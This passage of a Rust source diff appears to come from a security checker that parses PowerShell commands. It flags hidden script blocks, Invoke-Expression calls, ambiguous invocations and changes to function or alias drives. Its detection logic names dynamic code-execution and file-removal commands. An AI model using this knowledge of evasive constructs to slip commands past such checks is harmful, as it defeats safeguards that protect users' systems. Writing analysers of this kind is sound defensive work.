+                index += 1;
+            }
+            continue;
+        }
+        if let Some(kind) = powershell_function_quote(ch) {
+            quote = Some(kind);
+            index += ch.len_utf8();
+            continue;
+        }
+        if matches!(ch, '(' | '{') {
+            let close = find_shell_delimiter_close(raw, index, ShellType::PowerShell)?;
+            index = close + 1;
+            token_class = PowerShellLexTokenClass::Generic;
+            continue;
+        }
+        match ch {
+            '[' => bracket_depth = bracket_depth.saturating_add(1),
+            ']' if bracket_depth > 0 => bracket_depth -= 1,
+            '=' if bracket_depth == 0 => return Some(index),
+            _ => {}
+        }
+        token_class = match ch {
+            ch if ch.is_whitespace() => PowerShellLexTokenClass::Start,
+            ',' | ';' | '&' | '|' | '=' | '(' | ')' | '{' | '}' => PowerShellLexTokenClass::Start,
+            '<' | '>' if token_class.starts_special_token() => PowerShellLexTokenClass::Start,
+            _ => PowerShellLexTokenClass::Generic,
+        };
+        index += ch.len_utf8();
+    }
+    None
+}
+
+fn scan_powershell_hashtable_expressions(
+    raw: &str,
+    scan: &mut ExecutableSubstitutionScan,
+    hashtable_depth: usize,
+) {
+    let mut value_pending = false;
+    for segment in tokenize::tokenize(raw, ShellType::PowerShell) {
+        let value_continuation = value_pending
+            || matches!(
+                segment.preceding_separator.as_deref(),
+                Some("|" | "|&" | "&&" | "||" | "-and" | "-or" | "&")
+            );
+        if value_continuation {
+            if !segment.raw.trim().is_empty() {
+                scan_powershell_fragment_at_hashtable_depth(&segment.raw, scan, hashtable_depth);
+            }
+            value_pending = false;
+            continue;
+        }
+
+        let Some(separator) = powershell_top_level_hashtable_separator(&segment.raw) else {
+            continue;
+        };
+        if let Some(key) = segment
+            .raw
+            .get(..separator)
+            .filter(|key| !key.trim().is_empty())
+        {
+            scan_powershell_fragment_at_hashtable_depth(key, scan, hashtable_depth);
+        }
+        let Some(value) = segment.raw.get(separator + 1..) else {
+            record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+            continue;
+        };
+        if value.trim().is_empty() {
+            value_pending = true;
+        } else {
+            scan_powershell_fragment_at_hashtable_depth(value, scan, hashtable_depth);
+        }
+    }
+    if value_pending {
+        record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+    }
+}
+
+fn scan_powershell_fragment(raw: &str, scan: &mut ExecutableSubstitutionScan) {
+    scan_powershell_fragment_at_hashtable_depth(raw, scan, 0);
+}
+
+fn scan_powershell_fragment_at_hashtable_depth(
+    raw: &str,
+    scan: &mut ExecutableSubstitutionScan,
+    hashtable_depth: usize,
+) {
+    let bytes = raw.as_bytes();
+    let mut quote = None::<(PowerShellFunctionQuote, bool)>;
+    let mut token_class = PowerShellLexTokenClass::Start;
+    let mut i = 0usize;
+
+    if powershell_dynamic_scriptblock_argument(raw) {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+    }
+
+    while i < bytes.len() {
+        let byte = bytes[i];
+        let Some(ch) = raw.get(i..).and_then(|suffix| suffix.chars().next()) else {
+            return;
+        };
+        if let Some((kind, started_generic)) = quote {
+            if kind == PowerShellFunctionQuote::Double && ch == '`' {
+                i += ch.len_utf8();
+                if let Some(escaped) = raw.get(i..).and_then(|suffix| suffix.chars().next()) {
+                    i += escaped.len_utf8();
+                    if escaped == '\r' && bytes.get(i) == Some(&b'\n') {
+                        i += 1;
+                    }
+                }
+                continue;
+            }
+            // A subexpression inside a double-quoted string executes before the
+            // containing command receives the expanded value.
+            if kind == PowerShellFunctionQuote::Double
+                && ch == '$'
+                && bytes.get(i + 1) == Some(&b'(')
+            {
+                let Some(next) = capture_powershell_executable_body(raw, i + 1, scan) else {
+                    return;
+                };
+                i = next;
+                continue;
+            }
+            if powershell_function_quote(ch) == Some(kind) {
+                let next = i + ch.len_utf8();
+                if kind == PowerShellFunctionQuote::Single
+                    && raw
+                        .get(next..)
+                        .and_then(|suffix| suffix.chars().next())
+                        .and_then(powershell_function_quote)
+                        == Some(kind)
+                {
+                    i = next
+                        + raw
+                            .get(next..)
+                            .and_then(|suffix| suffix.chars().next())
+                            .map_or(0, char::len_utf8);
+                    continue;
+                }
+                quote = None;
+                token_class = if started_generic {
+                    PowerShellLexTokenClass::Generic
+                } else {
+                    PowerShellLexTokenClass::QuoteOnly
+                };
+            }
+            i += ch.len_utf8();
+            continue;
+        }
+
+        if bytes.get(i..i + 2) == Some(b"<#") && token_class.starts_special_token() {
+            i = powershell_block_comment_end_bytes(raw, i).unwrap_or(bytes.len());
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if byte == b'@' && token_class.starts_special_token() {
+            if let Some(here_string) = tokenize::powershell_here_string(raw, i) {
+                scan_powershell_here_string_subexpressions(raw, here_string, scan);
+                i = here_string.end;
+                token_class = PowerShellLexTokenClass::QuoteOnly;
+                continue;
+            }
+        }
+        if byte == b'@' && bytes.get(i + 1) == Some(&b'{') {
+            if hashtable_depth >= MAX_SHELL_DELIMITER_DEPTH {
+                record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+                return;
+            }
+            let started_generic = token_class == PowerShellLexTokenClass::Generic;
+            let open = i + 1;
+            if let Some(close) = find_shell_delimiter_close(raw, open, ShellType::PowerShell) {
+                if let Some(body) = raw.get(open + 1..close) {
+                    scan_powershell_hashtable_expressions(body, scan, hashtable_depth + 1);
+                }
+                i = close + 1;
+                token_class = if started_generic {
+                    PowerShellLexTokenClass::Generic
+                } else {
+                    PowerShellLexTokenClass::QuoteOnly
+                };
+                continue;
+            }
+            if let Some(body) = raw.get(open + 1..) {
+                scan_powershell_hashtable_expressions(body, scan, hashtable_depth + 1);
+            }
+            record_shell_execution_gap(scan, ShellExecutionGap::IncompletePowerShellInvocation);
+            return;
+        }
+        if byte == b'#' && token_class.starts_special_token() {
+            while i < bytes.len() && !matches!(bytes[i], b'\r' | b'\n') {
+                i += 1;
+            }
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if powershell_stop_parsing_at(raw, i, token_class) {
+            i = skip_powershell_stop_parsing(raw, i);
+            token_class = PowerShellLexTokenClass::Generic;
+            continue;
+        }
+        if byte == b'`' && i + 1 < bytes.len() {
+            i += 1;
+            let Some(escaped) = raw.get(i..).and_then(|suffix| suffix.chars().next()) else {
+                return;
+            };
+            if !matches!(escaped, '\n' | '\r') {
+                token_class = PowerShellLexTokenClass::Generic;
+            }
+            i += escaped.len_utf8();
+            if escaped == '\r' && bytes.get(i) == Some(&b'\n') {
+                i += 1;
+            }
+            continue;
+        }
+        if let Some(kind) = powershell_function_quote(ch) {
+            quote = Some((kind, token_class == PowerShellLexTokenClass::Generic));
+            i += ch.len_utf8();
+            continue;
+        }
+
+        if byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
+            let Some(next) = capture_powershell_executable_body(raw, i + 1, scan) else {
+                return;
+            };
+            i = next;
+            continue;
+        }
+
+        if byte == b'$' {
+            if let Some(variable_end) = powershell_variable_end(raw, i) {
+                if let Some(method_end) = powershell_scriptblock_method_end(raw, variable_end) {
+                    record_shell_execution_gap(
+                        scan,
+                        ShellExecutionGap::AmbiguousPowerShellInvocation,
+                    );
+                    i = method_end;
+                    continue;
+                }
+            }
+        }
+
+        if byte == b'.' {
+            match powershell_collection_scriptblock_argument(raw, i) {
+                Some(PowerShellCollectionScriptblockArgument::Static { open, close }) => {
+                    if let Some(body) = raw.get(open + 1..close) {
+                        scan.bodies.push(ExecutableBody {
+                            input: body.to_string(),
+                            shell: ShellType::PowerShell,
+                        });
+                    }
+                    token_class = PowerShellLexTokenClass::Start;
+                    i = close + 1;
+                    continue;
+                }
+                Some(PowerShellCollectionScriptblockArgument::Dynamic) => {
+                    record_shell_execution_gap(
+                        scan,
+                        ShellExecutionGap::AmbiguousPowerShellInvocation,
+                    );
+                }
+                Some(PowerShellCollectionScriptblockArgument::Inert { end }) => {
+                    token_class = PowerShellLexTokenClass::Generic;
+                    i = end;
+                    continue;
+                }
+                None => {}
+            }
+        }
+
+        let is_call = byte == b'&' && tokenize::powershell_ampersand_is_call(&raw[..i]);
+        let is_dot_source = byte == b'.'
+            && raw
+                .get(i + 1..)
+                .and_then(|suffix| suffix.chars().next())
+                .is_some_and(char::is_whitespace)
+            && tokenize::powershell_ampersand_is_call(&raw[..i]);
+        if is_call || is_dot_source {
+            let operand = skip_powershell_whitespace(raw, i + 1);
+            match bytes.get(operand).copied() {
+                Some(b'{') => {
+                    let Some(next) = capture_powershell_executable_body(raw, operand, scan) else {
+                        return;
+                    };
+                    i = next;
+                    continue;
+                }
+                Some(b'(') => {
+                    if let Some(close) =
+                        find_shell_delimiter_close(raw, operand, ShellType::PowerShell)
+                    {
+                        if let Some(body) = raw.get(operand + 1..close) {
+                            // `& ({ ... })` has a statically visible scriptblock;
+                            // other parenthesized targets execute their body but
+                            // choose the invoked command dynamically.
+                            if let Some(scriptblock) = complete_brace_body(body) {
+                                scan.bodies.push(ExecutableBody {
+                                    input: scriptblock.to_string(),
+                                    shell: ShellType::PowerShell,
+                                });
+                            } else {
+                                scan.bodies.push(ExecutableBody {
+                                    input: body.to_string(),
+                                    shell: ShellType::PowerShell,
+                                });
+                                record_shell_execution_gap(
+                                    scan,
+                                    ShellExecutionGap::AmbiguousPowerShellInvocation,
+                                );
+                            }
+                        }
+                        i = close + 1;
+                        continue;
+                    }
+                    let _ = capture_powershell_executable_body(raw, operand, scan);
+                    return;
+                }
+                // Variables, array expressions, and type/static-member
+                // expressions can yield either a command name or a ScriptBlock.
+                // Their result is not statically bound to the inspected source.
+                Some(b'$' | b'@' | b'[') => {
+                    record_shell_execution_gap(
+                        scan,
+                        ShellExecutionGap::AmbiguousPowerShellInvocation,
+                    );
+                }
+                None => {
+                    record_shell_execution_gap(
+                        scan,
+                        ShellExecutionGap::IncompletePowerShellInvocation,
+                    );
+                }
+                // A quoted or bare literal command is resolved by the ordinary
+                // segment command/wrapper logic; it is not a grouped-analysis
+                // ambiguity.
+                Some(_) => {
+                    let statically_bound = raw
+                        .get(operand..)
+                        .and_then(|suffix| {
+                            tokenize::tokenize(suffix, ShellType::PowerShell)
+                                .into_iter()
+                                .next()
+                        })
+                        .and_then(|segment| segment.command)
+                        .is_some_and(|command| {
+                            crate::rules::command::command_word_is_statically_bound(
+                                &command,
+                                ShellType::PowerShell,
+                            )
+                        });
+                    if !statically_bound {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousPowerShellInvocation,
+                        );
+                    }
+                }
+            }
+        }
+
+        if byte == b'(' {
+            if let Some(close) = find_shell_delimiter_close(raw, i, ShellType::PowerShell) {
+                if let Some(method_end) = powershell_scriptblock_method_end(raw, close + 1) {
+                    if let Some(scriptblock) = raw.get(i + 1..close).and_then(complete_brace_body) {
+                        scan.bodies.push(ExecutableBody {
+                            input: scriptblock.to_string(),
+                            shell: ShellType::PowerShell,
+                        });
+                    } else if let Some(body) = raw.get(i + 1..close) {
+                        scan.bodies.push(ExecutableBody {
+                            input: body.to_string(),
+                            shell: ShellType::PowerShell,
+                        });
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousPowerShellInvocation,
+                        );
+                    }
+                    i = method_end;
+                    continue;
+                }
+            }
+            let Some(next) = capture_powershell_executable_body(raw, i, scan) else {
+                return;
+            };
+            i = next;
+            continue;
+        }
+
+        if byte == b'{' {
+            let prefix = &raw[..i];
+            if powershell_scriptblock_argument_executes(prefix) {
+                let body_index = scan.bodies.len();
+                let Some(next) = capture_powershell_executable_body(raw, i, scan) else {
+                    return;
+                };
+                let command = tokenize::split_words(prefix.trim())
+                    .first()
+                    .map(|word| {
+                        crate::rules::command::normalize_cmd_base(word, ShellType::PowerShell)
+                    })
+                    .unwrap_or_default();
+                if command == "switch" {
+                    if let Some(body) = scan.bodies.get(body_index).map(|body| body.input.clone()) {
+                        push_powershell_switch_clause_bodies(&body, scan);
+                    }
+                }
+                i = next;
+                continue;
+            }
+            // A bare ScriptBlock is a value until an invocation context consumes
+            // it (`$block = { ... }` must remain dormant).  Skip its complete
+            // body, including substitutions that likewise do not run yet.
+            if let Some(close) = find_shell_delimiter_close(raw, i, ShellType::PowerShell) {
+                if let Some(method_end) = powershell_scriptblock_method_end(raw, close + 1) {
+                    if let Some(body) = raw.get(i + 1..close) {
+                        scan.bodies.push(ExecutableBody {
+                            input: body.to_string(),
+                            shell: ShellType::PowerShell,
+                        });
+                    }
+                    i = method_end;
+                    continue;
+                }
+                i = close + 1;
+                continue;
+            }
+            return;
+        }
+
+        token_class = match ch {
+            ch if ch.is_whitespace() => PowerShellLexTokenClass::Start,
+            ',' | ';' | '&' | '|' | '=' | '(' | ')' | '{' | '}' => PowerShellLexTokenClass::Start,
+            '<' | '>' if token_class.starts_special_token() => PowerShellLexTokenClass::Start,
+            _ => PowerShellLexTokenClass::Generic,
+        };
+        i += ch.len_utf8();
+    }
+}
+
+fn powershell_no_space_iex_direct(segment: &tokenize::Segment) -> Option<(String, Vec<String>)> {
+    let raw = segment.raw.trim();
+    let open = raw.find('(')?;
+    let command_spelling = raw.get(..open)?;
+    if !crate::rules::command::command_word_is_statically_bound(
+        command_spelling,
+        ShellType::PowerShell,
+    ) {
+        return None;
+    }
+    let direct = crate::rules::command::normalize_cmd_base(command_spelling, ShellType::PowerShell);
+    if !matches!(direct.as_str(), "iex" | "invoke-expression") {
+        return None;
+    }
+    let close = find_shell_delimiter_close(raw, open, ShellType::PowerShell)?;
+    let suffix = raw.get(close + 1..)?.trim();
+    let mut args = Vec::with_capacity(2);
+    if let Some(argument) = raw.get(open + 1..close) {
+        if !argument.trim().is_empty() {
+            args.push(argument.to_string());
+        }
+    }
+    if !suffix.is_empty() {
+        args.push(suffix.to_string());
+    }
+    Some((direct, args))
+}
+
+fn resolved_powershell_direct(segment: &tokenize::Segment) -> (String, Vec<String>) {
+    if powershell_segment_root_is_string_data(segment) {
+        return (String::new(), Vec::new());
+    }
+    if let Some(direct) = powershell_no_space_iex_direct(segment) {
+        return direct;
+    }
+    resolve_wrapped_command_for_shell(segment, ShellType::PowerShell)
+        .map(|(command, args)| {
+            (
+                crate::rules::command::normalize_cmd_base(&command, ShellType::PowerShell),
+                args,
+            )
+        })
+        .unwrap_or_else(|| {
+            (
+                segment
+                    .command
+                    .as_deref()
+                    .map(|command| {
+                        crate::rules::command::normalize_cmd_base(command, ShellType::PowerShell)
+                    })
+                    .unwrap_or_default(),
+                segment.args.clone(),
+            )
+        })
+}
+
+fn powershell_segment_root_is_string_data(segment: &tokenize::Segment) -> bool {
+    segment
+        .command
+        .as_deref()
+        .and_then(|command| command.trim_start().chars().next())
+        .is_some_and(|ch| powershell_function_quote(ch).is_some())
+}
+
+fn powershell_dispatch_provider_path(raw: &str) -> bool {
+    let path = raw.trim().to_ascii_lowercase();
+    if path.starts_with("alias:") || path.starts_with("function:") {
+        return true;
+    }
+    path.split_once("::").is_some_and(|(provider, _)| {
+        provider
+            .rsplit(['\\', '/'])
+            .next()
+            .is_some_and(|provider| matches!(provider, "alias" | "function"))
+    })
+}
+
+fn powershell_static_path_values(raw: &str) -> Result<Vec<String>, ()> {
+    let mut values = Vec::new();
+    let mut start = 0usize;
+    let mut index = 0usize;
+    let mut quote = None;
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if ch == '`' {
+            index += ch.len_utf8();
+            let Some(escaped) = raw.get(index..).and_then(|suffix| suffix.chars().next()) else {
+                return Err(());
+            };
+            index += escaped.len_utf8();
+            continue;
+        }
+        if let Some(kind) = quote {
+            if powershell_function_quote(ch) == Some(kind) {
+                quote = None;
+            }
+            index += ch.len_utf8();
+            continue;
+        }
+        if let Some(kind) = powershell_function_quote(ch) {
+            quote = Some(kind);
+            index += ch.len_utf8();
+            continue;
+        }
+        if matches!(
+            ch,
+            '$' | '@' | '(' | ')' | '{' | '}' | '[' | ']' | '+' | ';' | '|' | '&'
+        ) {
+            // Grouping, interpolation, splatting, and concatenation make the
+            // provider path an expression rather than a statically bound word.
+            return Err(());
+        }
+        if ch == ',' {
+            let value = raw.get(start..index).ok_or(())?;
+            let value = static_wrapper_word(value, ShellType::PowerShell).ok_or(())?;
+            if value.is_empty() {
+                return Err(());
+            }
+            values.push(value);
+            index += ch.len_utf8();
+            start = index;
+            continue;
+        }
+        index += ch.len_utf8();
+    }
+    if quote.is_some() {
+        return Err(());
+    }
+    let value = raw.get(start..).ok_or(())?;
+    let value = static_wrapper_word(value, ShellType::PowerShell).ok_or(())?;
+    if value.is_empty() {
+        return Err(());
+    }
+    values.push(value);
+    Ok(values)
+}
+
+fn powershell_path_value_continues(raw: &str) -> bool {
+    let raw = raw.trim_end();
+    if !raw.ends_with(',') {
+        return false;
+    }
+    let mut quote = None;
+    let mut index = 0usize;
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if ch == '`' {
+            index += ch.len_utf8();
+            let Some(escaped) = raw.get(index..).and_then(|suffix| suffix.chars().next()) else {
+                return false;
+            };
+            index += escaped.len_utf8();
+            continue;
+        }
+        if let Some(kind) = quote {
+            if powershell_function_quote(ch) == Some(kind) {
+                quote = None;
+            }
+        } else if let Some(kind) = powershell_function_quote(ch) {
+            quote = Some(kind);
+        }
+        index += ch.len_utf8();
+    }
+    quote.is_none()
+}
+
+fn powershell_path_values_from_args(
+    args: &[String],
+    start: usize,
+) -> Result<(Vec<String>, usize), ()> {
+    let mut raw = args.get(start).ok_or(())?.clone();
+    let mut next = start + 1;
+    while powershell_path_value_continues(&raw) {
+        let continuation = args.get(next).ok_or(())?;
+        if crate::rules::command::normalize_powershell_parameter_token(
+            continuation,
+            ShellType::PowerShell,
+        )
+        .starts_with('-')
+        {
+            return Err(());
+        }
+        raw.push(' ');
+        raw.push_str(continuation);
+        next += 1;
+    }
+    Ok((powershell_static_path_values(&raw)?, next))
+}
+
+fn powershell_provider_path_arguments(command: &str, args: &[String]) -> Result<Vec<String>, ()> {
+    enum PositionalPaths {
+        First,
+        FirstTwo,
+        All,
+    }
+
+    let positional_paths = match command {
+        "set-item" | "si" | "new-item" | "ni" | "clear-item" | "cli" | "rename-item" | "rni"
+        | "ren" | "set-content" | "sc" => PositionalPaths::First,
+        "move-item" | "mi" | "move" | "mv" | "copy-item" | "cpi" | "copy" | "cp" => {
+            PositionalPaths::FirstTwo
+        }
+        "remove-item" | "ri" | "del" | "erase" | "rd" | "rm" | "rmdir" => PositionalPaths::All,
+        _ => return Ok(Vec::new()),
+    };
+
+    let role_count = match positional_paths {
+        PositionalPaths::First => Some(1usize),
+        PositionalPaths::FirstTwo => Some(2usize),
+        PositionalPaths::All => None,
+    };
+    let mut roles = role_count.map(|count| vec![None::<Vec<String>>; count]);
+    let mut all_paths = Vec::new();
+    let mut relative_names = Vec::new();
+    let mut index = 0usize;
+    while index < args.len() {
+        let raw_option = &args[index];
+        let option = crate::rules::command::normalize_powershell_parameter_token(
+            raw_option,
+            ShellType::PowerShell,
+        );
+        if !option.starts_with('-') || option == "-" {
+            if let Some(roles) = roles.as_mut() {
+                if let Some(role) = roles.iter().position(Option::is_none) {
+                    let (paths, next) = powershell_path_values_from_args(args, index)?;
+                    roles[role] = Some(paths);
+                    index = next;
+                } else {
+                    // Remaining positionals are Value/other non-path operands.
+                    index += 1;
+                }
+            } else {
+                let (paths, next) = powershell_path_values_from_args(args, index)?;
+                all_paths.extend(paths);
+                index = next;
+            }
+            continue;
+        }
+        let lower = option.to_ascii_lowercase();
+        let delimiter = raw_option
+            .char_indices()
+            .find_map(|(offset, ch)| matches!(ch, ':' | '=').then_some(offset));
+        let (name, attached) = delimiter.map_or((lower, None), |offset| {
+            let raw_name = raw_option.get(..offset).unwrap_or_default();
+            (
+                crate::rules::command::normalize_powershell_parameter_token(
+                    raw_name,
+                    ShellType::PowerShell,
+                )
+                .to_ascii_lowercase(),
+                raw_option.get(offset + 1..),
+            )
+        });
+        if matches!(name.as_str(), "-path" | "-literalpath" | "-destination") {
+            let (paths, next) = if let Some(attached) = attached.filter(|value| !value.is_empty()) {
+                (powershell_static_path_values(attached)?, index + 1)
+            } else {
+                powershell_path_values_from_args(args, index + 1)?
+            };
+            if let Some(roles) = roles.as_mut() {
+                let role = usize::from(name == "-destination");
+                let Some(slot) = roles.get_mut(role) else {
+                    return Err(());
+                };
+                if slot.is_some() {
+                    return Err(());
+                }
+                *slot = Some(paths);
+            } else {
+                all_paths.extend(paths);
+            }
+            index = next;
+            continue;
+        }
+        if name == "-name" && matches!(command, "new-item" | "ni") {
+            let (names, next) = if let Some(attached) = attached.filter(|value| !value.is_empty()) {
+                (powershell_static_path_values(attached)?, index + 1)
+            } else {
+                powershell_path_values_from_args(args, index + 1)?
+            };
+            relative_names.extend(names);
+            index = next;
+            continue;
+        }
+        if matches!(
+            name.as_str(),
+            "-value"
+                | "-newname"
+                | "-filter"
+                | "-include"
+                | "-exclude"
+                | "-credential"
+                | "-stream"
+                | "-encoding"
+                | "-erroraction"
+                | "-ea"
+                | "-errorvariable"
+                | "-ev"
+                | "-informationaction"
+                | "-infa"
+                | "-informationvariable"
+                | "-iv"
+                | "-outbuffer"
+                | "-ob"
+                | "-outvariable"
+                | "-ov"
+                | "-pipelinevariable"
+                | "-pv"
+                | "-progressaction"
+                | "-proga"
+                | "-warningaction"
+                | "-wa"
+                | "-warningvariable"
+                | "-wv"
+        ) {
+            if attached.is_none() {
+                if args.get(index + 1).is_none() {
+                    return Err(());
+                }
+                index += 2;
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        if matches!(
+            name.as_str(),
+            "-force"
+                | "-recurse"
+                | "-confirm"
+                | "-whatif"
+                | "-passthru"
+                | "-container"
+                | "-noclobber"
+                | "-nonewline"
+                | "-asbytestream"
+                | "-usetransaction"
+                | "-debug"
+                | "-db"
+                | "-verbose"
+                | "-vb"
+                | "-wi"
+                | "-cf"
+        ) {
+            index += 1;
+            continue;
+        }
+        return Err(());
+    }
+
+    if let Some(roles) = roles {
+        let first_path_missing = roles.first().is_none_or(Option::is_none);
+        let mut paths = roles.into_iter().flatten().flatten().collect::<Vec<_>>();
+        if first_path_missing {
+            paths.extend(relative_names);
+        }
+        Ok(paths)
+    } else {
+        Ok(all_paths)
+    }
+}
+
+fn powershell_path_is_provider_qualified(raw: &str) -> bool {
+    let path = raw.trim();
+    if path.contains("::") {
+        return true;
+    }
+    path.split_once(':').is_some_and(|(drive, _)| {
+        !drive.is_empty()
+            && drive
+                .chars()
+                .all(|ch| ch == '_' || ch == '-' || ch == '.' || ch.is_ascii_alphanumeric())
+    })
+}
+
+fn powershell_known_non_dispatch_provider_path(raw: &str) -> bool {
+    let path = raw.trim().to_ascii_lowercase();
+    if let Some((provider, _)) = path.split_once("::") {
+        let provider = provider.rsplit(['\\', '/']).next().unwrap_or(provider);
+        return matches!(
+            provider,
+            "filesystem" | "environment" | "variable" | "certificate" | "registry" | "wsman"
+        );
+    }
+    let Some((drive, _)) = path.split_once(':') else {
+        return false;
+    };
+    matches!(
+        drive,
+        "env" | "variable" | "cert" | "hklm" | "hkcu" | "wsman"
+    ) || (drive.len() == 1 && drive.as_bytes()[0].is_ascii_alphabetic())
+}
+
+fn powershell_provider_dispatch_mutation(
+    command: &str,
+    args: &[String],
+    dispatch_location: bool,
+) -> bool {
+    if matches!(
+        command,
+        "new-psdrive" | "ndr" | "mount" | "remove-psdrive" | "rdr"
+    ) {
+        // A custom drive may be backed by Function/Alias providers. Tracking
+        // drive creation/removal is required before later paths can be proven.
+        return true;
+    }
+    match powershell_provider_path_arguments(command, args) {
+        Ok(paths) => paths.iter().any(|path| {
+            powershell_dispatch_provider_path(path)
+                || (powershell_path_is_provider_qualified(path)
+                    && !powershell_known_non_dispatch_provider_path(path))
+                || (dispatch_location && !powershell_path_is_provider_qualified(path))
+        }),
+        Err(()) => true,
+    }
+}
+
+fn powershell_assignment_operator(raw: &str) -> bool {
+    matches!(
+        crate::rules::command::normalize_shell_token(raw, ShellType::PowerShell).as_str(),
+        "=" | "+=" | "-=" | "*=" | "/=" | "%=" | "??="
+    )
+}
+
+fn powershell_dispatch_variable_target(raw: &str) -> bool {
+    let raw = raw.trim();
+    if !raw.starts_with('$') {
+        return false;
+    }
+    let target = raw
+        .strip_prefix("${")
+        .and_then(|target| target.strip_suffix('}'))
+        .or_else(|| raw.strip_prefix('$'))
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+    target.starts_with("function:") || target.starts_with("alias:")
+}
+
+fn powershell_top_level_assignment_words(raw: &str) -> Vec<String> {
+    let mut visible = String::with_capacity(raw.len());
+    let mut quote = None;
+    let mut paren_depth = 0usize;
+    let mut brace_depth = 0usize;
+    let mut bracket_depth = 0usize;
+    let mut index = 0usize;
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if let Some(kind) = quote {
+            if kind == PowerShellFunctionQuote::Double && ch == '`' {
+                index += ch.len_utf8();
+                if let Some(escaped) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+                    index += escaped.len_utf8();
+                }
+                visible.push(' ');
+                continue;
+            }
+            if powershell_function_quote(ch) == Some(kind) {
+                let next = index + ch.len_utf8();
+                if kind == PowerShellFunctionQuote::Single
+                    && raw
+                        .get(next..)
+                        .and_then(|suffix| suffix.chars().next())
+                        .and_then(powershell_function_quote)
+                        == Some(kind)
+                {
+                    index = next
+                        + raw
+                            .get(next..)
+                            .and_then(|suffix| suffix.chars().next())
+                            .map_or(0, char::len_utf8);
+                    visible.push(' ');
+                    continue;
+                }
+                quote = None;
+            }
+            index += ch.len_utf8();
+            visible.push(' ');
+            continue;
+        }
+
+        if let Some(kind) = powershell_function_quote(ch) {
+            quote = Some(kind);
+            visible.push(' ');
+            index += ch.len_utf8();
+            continue;
+        }
+        if ch == '`' {
+            index += ch.len_utf8();
+            if let Some(escaped) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+                index += escaped.len_utf8();
+            }
+            visible.push(' ');
+            continue;
+        }
+        if ch == '$' && raw.get(index + 1..index + 2) == Some("{") {
+            let Some(relative_close) = raw.get(index + 2..).and_then(|suffix| suffix.find('}'))
+            else {
+                visible.push(' ');
+                break;
+            };
+            let close = index + 2 + relative_close;
+            if paren_depth == 0 && brace_depth == 0 && bracket_depth == 0 {
+                if let Some(variable) = raw.get(index..=close) {
+                    visible.push_str(variable);
+                }
+            } else {
+                visible.push(' ');
+            }
+            index = close + 1;
+            continue;
+        }
+        match ch {
+            '(' => paren_depth = paren_depth.saturating_add(1),
+            ')' => paren_depth = paren_depth.saturating_sub(1),
+            '{' => brace_depth = brace_depth.saturating_add(1),
+            '}' => brace_depth = brace_depth.saturating_sub(1),
+            '[' => bracket_depth = bracket_depth.saturating_add(1),
+            ']' => bracket_depth = bracket_depth.saturating_sub(1),
+            _ => {}
+        }
+        if paren_depth == 0 && brace_depth == 0 && bracket_depth == 0 {
+            visible.push(ch);
+        } else {
+            visible.push(' ');
+        }
+        index += ch.len_utf8();
+    }
+    tokenize::split_words(&visible)
+}
+
+fn powershell_provider_variable_assignment(segment: &tokenize::Segment) -> bool {
+    if !segment
+        .command
+        .as_deref()
+        .is_some_and(|command| command.trim_start().starts_with('$'))
+    {
+        return false;
+    }
+    let words = powershell_top_level_assignment_words(&segment.raw);
+    for (index, word) in words.iter().enumerate() {
+        if powershell_dispatch_variable_target(word)
+            && words
+                .get(index + 1)
+                .is_some_and(|operator| powershell_assignment_operator(operator))
+        {
+            return true;
+        }
+        let components = word.split('=').collect::<Vec<_>>();
+        if components
+            .iter()
+            .take(components.len().saturating_sub(1))
+            .map(|target| target.trim_end_matches(['?', '+', '-', '*', '/', '%']))
+            .any(powershell_dispatch_variable_target)
+        {
+            return true;
+        }
+    }
+    false
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PowerShellLocationTransition {
+    None,
+    Set(Option<bool>),
+    Push(Option<bool>),
+    Pop,
+    Ambiguous,
+}
+
+fn powershell_location_transition(
+    command: &str,
+    args: &[String],
+    incoming_pipeline: bool,
+) -> PowerShellLocationTransition {
+    let kind = match command {
+        "set-location" | "sl" | "cd" | "chdir" => false,
+        "push-location" | "pushd" => true,
+        "pop-location" | "popd" => {
+            return if incoming_pipeline || !args.is_empty() {
+                PowerShellLocationTransition::Ambiguous
+            } else {
+                PowerShellLocationTransition::Pop
+            };
+        }
+        _ => return PowerShellLocationTransition::None,
+    };
+    if incoming_pipeline {
+        // `Path` accepts pipeline input. Without modeling the incoming object,
+        // the destination provider cannot be proven even when argv is empty.
+        return PowerShellLocationTransition::Ambiguous;
+    }
+    let mut path = None;
+    let mut index = 0usize;
+    while index < args.len() {
+        let raw = &args[index];
+        let normalized =
+            crate::rules::command::normalize_powershell_parameter_token(raw, ShellType::PowerShell);
+        if !normalized.starts_with('-') || normalized == "-" {
+            if path.is_some() {
+                return PowerShellLocationTransition::Ambiguous;
+            }
+            path = static_wrapper_word(raw, ShellType::PowerShell);
+            if path.is_none() {
+                return PowerShellLocationTransition::Ambiguous;
+            }
+            index += 1;
+            continue;
+        }
+        let delimiter = raw
+            .char_indices()
+            .find_map(|(offset, ch)| matches!(ch, ':' | '=').then_some(offset));
+        let (name, attached) =
+            delimiter.map_or((normalized.to_ascii_lowercase(), None), |offset| {
+                (
+                    crate::rules::command::normalize_powershell_parameter_token(
+                        raw.get(..offset).unwrap_or_default(),
+                        ShellType::PowerShell,
+                    )
+                    .to_ascii_lowercase(),
+                    raw.get(offset + 1..),
+                )
+            });
+        if matches!(name.as_str(), "-path" | "-literalpath") {
+            let value = if let Some(attached) = attached.filter(|value| !value.is_empty()) {
+                attached
+            } else {
+                index += 1;
+                let Some(value) = args.get(index) else {
+                    return PowerShellLocationTransition::Ambiguous;
+                };
+                value
+            };
